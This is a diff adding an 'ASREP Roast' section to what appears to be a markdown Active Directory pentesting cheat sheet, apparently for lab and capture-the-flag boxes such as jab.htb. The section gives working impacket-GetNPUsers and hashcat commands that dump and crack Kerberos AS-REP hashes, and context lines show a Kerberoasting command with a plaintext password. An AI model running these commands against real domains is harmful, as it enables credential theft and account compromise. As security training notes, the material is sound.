@@ -1015,6 +1015,20 @@ GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -requ
 ```
 </details>
 
+## ASREP Roast
+Get the TGT for users that have 'pre-authentication' set to not required. Basically we get the encrypted hash and try to crack it offline
+See:
+
+* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
+* https://tools.thehacker.recipes/impacket/examples/getnpusers.py
+* https://medium.com/@markmotig/dump-password-hashes-for-offline-cracking-by-forcing-as-rep-roasting-ca43f6e76cdd
+
+
+```
+impacket-GetNPUsers jab.htb/ -usersfile pidgin_users.txt -format hashcat -outputfile hashes.asreproast
+hashcat -m 18200 hashes.asreproast rockyou.txt
+```
+
 ## cPassword / Group Policy Preferences (GPP) Attacks
 
 :information_source: GPP's allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a 'cPassword'. The key was accidentally released. Patched with MS14-025 but does not prevent the previous uses. If the policy was set before this was patched. [Blogpost](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
